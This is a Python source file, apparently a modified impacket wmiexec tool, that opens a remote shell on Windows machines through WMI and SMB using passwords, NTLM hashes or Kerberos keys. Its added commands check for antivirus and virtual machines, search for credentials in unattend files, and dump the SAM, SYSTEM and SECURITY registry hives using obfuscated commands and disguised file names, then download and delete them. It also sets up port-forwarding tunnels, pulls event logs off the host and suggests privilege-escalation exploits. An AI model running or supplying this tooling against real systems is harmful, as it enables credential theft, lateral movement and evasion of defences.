#!/usr/bin/env python
#made with <3 by ice-wzl
from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import random
from termcolor import colored, cprint
import argparse
import time
import logging
import ntpath
import re
from base64 import b64encode
import uuid
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.krb5.keytab import Keytab
from six import PY2

OUTPUT_FILENAME = f"{{{uuid.uuid4()}}}".lower()
CODEC = sys.stdout.encoding


class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, silentCommand=False):
        if self.__noOutput is False and silentCommand is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, silentCommand)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                self.shell.cmdloop()
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\Temp\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[!] **Obsfucated wmiexec** Launching semi-interactive shell\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 --------------------------------------------------------------------------------------------
 + Basic Module                                                                            +  
 --------------------------------------------------------------------------------------------
  CRTL+L                     - clear screen
  sysinfo                    - see basic information about the host
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
  lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current dir)
  lget {file}                 - downloads pathname to the current local dir
  ! {cmd}                    - executes a local shell cmd
  cat                        - view file contents
  ls                         - you should know this, will show hidden files 
 --------------------------------------------------------------------------------------------
 + Process Accounting                                                                      +
 --------------------------------------------------------------------------------------------
  psp                        - looks for Anti-Virus solutions running in the process list
  vmcheck                    - attempts to detect if we are running in a vm
 --------------------------------------------------------------------------------------------
 + Credential Harvesting                                                                    +
 --------------------------------------------------------------------------------------------
  unattend                   - find all unattended files (potential base64 credentials)
  regrip                     - save sam, security, system to target pwd
  creds                      - enumerate LSA Protection, WDigest, Credential Guard, Cached 
                               logon count 
 --------------------------------------------------------------------------------------------
 + Tunneling                                                                               + 
 --------------------------------------------------------------------------------------------
  showtun                   - see all tunnels
  addtun                    - add tunnel --> addtun lport rhost rport --> 10000 10.0.0.1 443
  deltun                    - delete tunnel --> deltun lport --> deltun 11000  
 --------------------------------------------------------------------------------------------
 + Collection                                                                               +
 --------------------------------------------------------------------------------------------
  loggrab                   - collects log of your choice --> loggrab Security.evtx 
  survey                    - performs host survey of target, saves output to local machine
 --------------------------------------------------------------------------------------------
 + Priv Esc                                                                                 +
 --------------------------------------------------------------------------------------------
  tokens                    - enumerate enabled tokens for priv esc path
  """)

    def do_survey(self, s):
        save_local_option = s.split(" ")[0]
        if save_local_option == "save":
            try:
                logging.info("Saving all output from survey to survey.txt in your local pwd")
                logging.info("Starting Survey")
                local_save_file = open("survey.txt", "a")

                config_file = open("survey.conf", "r+")
                current_line = config_file.readline()

                for item in config_file:
                    local_save_file.write("[*] %s \n" % (item))
                    self.execute_remote(item.strip('\n'))
                    time.sleep(1)
                    local_save_file.write(self.__outputBuffer.strip('\r\n') + '\n')
                    self.__outputBuffer = ''
                logging.info("Survey Completed")
            except:
                logging.info("Something went wrong, try again")
        else:
            try:
                logging.info("Starting Survey")
                config_file = open("survey.conf", "r+")
                current_line = config_file.readline()

                for item in config_file:
                    print("[*] %s" % (item))
                    self.execute_remote(item.strip('\n'))
                    time.sleep(1)
                    if len(self.__outputBuffer.strip('\r\n')) > 0:
                        print(self.__outputBuffer)
                        self.__outputBuffer = ''
                logging.info("Survey Completed")
            except:
                logging.info("Something went wrong, try again")

    def do_loggrab(self, s):
        try:
            prefix = 'copy '
            log_file_name = s 
            file_path = 'C:\Windows\System32\Winevt\Logs\\'
            remote_copy = ' C:\Windows\system32\spool\drivers\color'
            combined_command = prefix + '"' + file_path + s + '"' + remote_copy
            self.execute_remote(combined_command)
            logging.info(s)
            self.do_lget(remote_copy.lstrip() + '\\' + s)
            self.execute_remote("del" + remote_copy + '\\' + s)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
        except:
            pass


    def do_mounts(self, s):
        try:
            self.execute_remote("wmic logicaldisk get description,name")
            find_description_start = "Description"
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                new_buff = self.__outputBuffer.split("codec")[0]
                print(new_buff)
                self.__outputBuffer = ''

        except:
            pass

    def do_sysinfo(self, s):
        try:
            logging.info("Target")
            self.execute_remote('whoami')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
            logging.info("Hostname")
            self.execute_remote('hostname')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            logging.info("Arch: ")
            self.execute_remote('SET Processor | findstr /i "PROCESSOR_ARCHITECTURE"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
            logging.info("IP Addresses: ") 
            self.execute_remote('ipconfig /all | findstr /i "(Preferred)"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            logging.info('Last Reboot')
            if self.__shell_type == 'powershell':
                self.execute_remote('gci -h C:\pagefile.sys')
            else:
                self.execute_remote('dir /a C:\pagefile.sys | findstr /R "4[0-9]"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:                
                print(self.__outputBuffer)
                self.__outputBuffer = ''
        except:
            pass

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_lget(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename, 'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1] + '$', tail, fh.write)
            fh.close()

        except Exception as e:
            logging.error(str(e))

            if os.path.exists(filename):
                os.remove(filename)

    def do_addtun(self, s):
        lport = s.split(" ")[0]
        rhost = s.split(" ")[1]
        rport = s.split(" ")[2]
        try:
            self.execute_remote("netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (lport, rport, rhost))
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
        except:
            pass

    def do_showtun(self, s):
        try:
            self.execute_remote("netsh interface portproxy show v4tov4")
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
        except:
            pass

    def do_deltun(self, s):
        lport = s.split(" ")[0] 
        try:
            self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
        except:
            pass
    
    def do_ls(self, s):
        #see if user specified a dir or not
        if len(s) == 0:
            try:
                self.execute_remote('dir -h .')
                if len(self.__outputBuffer.strip('\r\n')) > 0:
                    print(self.__outputBuffer)
                    self.__outputBuffer = '' 
            except:
                pass
        else:
            path = s.split(" ")[0]
            try:
                self.execute_remote('dir -h %s' % (path))
                if len(self.__outputBuffer.strip('\r\n')) > 0:
                    print(self.__outputBuffer)
                    self.__outputBuffer = '' 
            except:
                pass


    def do_lput(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/', '\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd, dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_psp(self, s):
        try:
            self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe || WinDefend || MSASCui.exe || navapsvc.exe || avkwctl.exe || fsav32.exe || mcshield.exe || ntrtscan.exe || avguard.exe || ashServ.exe || avengine.exe || avgemc.exe || tmntsrv.exe || kavfswp.exe || kavtray.exe || vapm.exe || avpui.exe || avp.exe"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                buff = self.__outputBuffer
                cprint(buff, "red")
                self.__outputBuffer = ''
        except:
            pass

    def do_tokens(self, s):
        self.execute_remote('whoami /priv | findstr /i "Enabled"')
        if len(self.__outputBuffer.strip('\r\n')) > 0: 
            if "SeImpersonatePrivilege" in self.__outputBuffer:
                print('SeImpersonate Enabled: \n   juicy-potato\n   RougeWinRM\n   SweetPotato\n   PrintSpoofer')
        #dont clear the ouput buffer until you are done with your checks 
            if "SeBackupPrivilege" in self.__outputBuffer:
                print('SeBackupPrivilege Enabled: \n   https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n   https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n   https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
            if "SeTakeOwnershipPrivilege" in self.__outputBuffer:
                print('SeTakeOwnershipPrivilege Enabled: \n   takeown /f "C:\windows\system32\config\SAM"\n   icacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
            if "SeDebugPrivilege" in self.__outputBuffer:
                print("SeDebugPrivilege Enabled: \n   Procdump.exe on LSASS.exe, use mimikatz")
        else:
            logging.info("No Valuable Tokens Found")
        self.__outputBuffer = ''

    def do_creds(self, s):
        #WDigest 
        self.execute_remote("reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
        if "0x0" in self.__outputBuffer or "0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
            logging.info("WDigest is not enabled")
            self.__outputBuffer = ''
        else:
            logging.info("WDigest might be enabled --> LSASS clear text creds")
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                print(self.__outputBuffer)
                self.__outputBuffer = ''
        self.execute_remote("reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL")
        if "0x1" in self.__outputBuffer or "1" in self.__outputBuffer:
            logging.info("LSA Protection Enabled")
            self.__outputBuffer = ''
        else:
            logging.info("LSA Protection not enabled")
            self.__outputBuffer = ''
        self.execute_remote("reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags")
        if "0x0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
            logging.info("Credential Guard Probably not enabled")
            self.__outputBuffer = ''
        elif "0x1" or "1" in self.__outputBuffer:
            logging.info("Credential Guard active with UEFI lock")
            self.__outputBuffer = ''
        elif "0x2" or "2" in self.__outputBuffer:
            logging.info("Credential Guard enabled without UEFI lock")
            self.__outputBuffer = ''
        else:
            logging.info("Error: Couldnt enumerate Credential Guard")
        self.execute_remote('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
        if "10" in self.__outputBuffer:
            logging.info("Default of 10 cached logons")
            self.__outputBuffer = '' 

        else:
            logging.info("Cached Logon Credential Amount")
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                print(self.__outputBuffer)
                self.__outputBuffer = '' 

    def do_vmcheck(self, s):
        try:
            logging.info("Common Processes: ")
            self.execute_remote('tasklist /svc | findstr /i "vmtoolsd.exe"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                buff = self.__outputBuffer
                cprint(buff, "red")
                self.__outputBuffer = ''
            else:
                logging.info("No VM Processes found")
            self.execute_remote('dir "C:\Program Files\VMware"')
            if len(self.__outputBuffer.strip('\r\n')) > 125: 
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                self.__outputBuffer = ''
                logging.info('C:\Program Files\VMWare Does not exist')
            self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                print(self.__outputBuffer)
                self.__outputBuffer = ''
        except:
            logging.info("Something went wrong, try again")

    def do_cat(self, s):
        try:
            self.execute_remote('type ' + s)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                print(self.__outputBuffer)
                self.__outputBuffer = ''
        except:
            logging.critical(str(e))
            pass

    def do_unattend(self, s):
        one = r"C:\unattend.txt"
        two = r"C:\unattend.inf"
        three = r"C:\Windows\sysprep.inf"
        four = r"C:\Windows\sysprep\sysprep.xml"
        five = r"C:\Windows\sysprep\sysprep.inf"
        six = r"C:\Windows\Panther\Unattended.xml"
        seven = r"C:\Windows\Panther\Unattend.xml"
        eight = r"C:\Windows\Panther\Unattend\Unattend.xml"
        nine = r"C:\Windows\Panther\Unattend\Unattended.xml"
        ten = r"C:\Windows\System32\Sysprep\unattend.xml"
        eleven = r"C:\Windows\System32\Sysprep\unattended.xml"

        try:
            logging.info("Looking for: %s, %s" % (one, two))
            self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                print("Nothing Found")
        except:
            pass

        try:
            logging.info("Looking for: %s" % (three))
            self.execute_remote("dir C:\Windows | findstr /i 'sysprep.inf'")
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = '' 
            else:
                print("Nothing Found")
        except:
            pass

        try:
            logging.info("Looking for: %s, %s" % (four, five))
            self.execute_remote(r'dir C:\Windows\sysprep | findstr /i "sysprep.inf || sysprep.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                print("Nothing Found")
        except:
            pass
        try:
            logging.info("Looking for: %s, %s" % (six, seven))
            self.execute_remote(r'dir C:\Windows\Panther | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                print("Nothing Found")
        except:
            pass
        try:
            logging.info("Looking for: %s, %s" % (eight, nine))
            self.execute_remote(r'dir C:\Windows\Panther\Unattend | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                print("Nothing Found")
        except:
            pass
        try:
            logging.info("Looking for: %s, %s" % (ten, eleven))
            self.execute_remote('dir C:\Windows\System32\Sysprep | findstr /i "unattend.xml || unattended.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                print("Nothing Found")
        except:
            pass

    def do_regrip(self, s):
        try:
            logging.info("SAM")
            self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            logging.info("System")
            self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            logging.info("Security")
            self.execute_remote(r'reg save "HK"L""M\s""ec""u"rit"y"" update.exe')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            self.do_lget("win32.dll")
            os.rename("win32.dll", "SAM")
            self.do_lget("win32.exe")
            os.rename("win32.exe", "System")
            self.do_lget("update.exe")
            os.rename("update.exe", "Security")
            self.execute_remote("del win32.dll")
            self.execute_remote("del win32.exe")
            self.execute_remote("del update.exe")
        except:
            pass


    def do_exit(self, s):
        return True

    def do_EOF(self, s):
        print()
        return self.do_exit(s)

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            if self.__shell_type == 'powershell':
                self.prompt = '\U0001F47B' + ' ' + 'PS ' + self.prompt + ' '
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.__shell + data

        if self.__noOutput is False:
            command += ' 1> ' + '\\\\localhost\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print(self.__outputBuffer)
        self.__outputBuffer = ''


class AuthFileSyntaxError(Exception):
    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path = path
        self.lineno = lineno
        self.reason = reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason)


def load_smbclient_auth_file(path):
    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno = 0
    domain = None
    username = None
    password = None
    for line in open(path):
        lineno += 1

        line = line.strip()

        if line.startswith('#') or line == '':
            continue

        parts = line.split('=', 1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k, v) = (parts[0].strip(), parts[1].strip())

        if k == 'username':
            username = v
        elif k == 'password':
            password = v
        elif k == 'domain':
            domain = v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from '
                                                                         '(default ADMIN$)')
    parser.add_argument('-nooutput', action='store_true', default=False, help='whether or not to print the output '
                                                                              '(no SMB connection created)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-silentcommand', action='store_true', default=False,
                        help='does not execute cmd.exe to run given command (no output)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'],
                        help='choose a command processor for the semi-interactive shell')
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('command', nargs='*', default=' ', help='command to execute at the target. If empty it will '
                                                                'launch a semi-interactive shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if ' '.join(options.command) == ' ' and options.nooutput is True:
        logging.error("-nooutput switch and interactive shell not supported")
        sys.exit(1)
    if options.silentcommand and options.command == ' ':
        logging.error("-silentcommand switch and interactive shell not supported")
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
            repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
                           options.share, options.nooutput, options.k, options.dc_ip, options.shell_type)
        executer.run(address, options.silentcommand)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
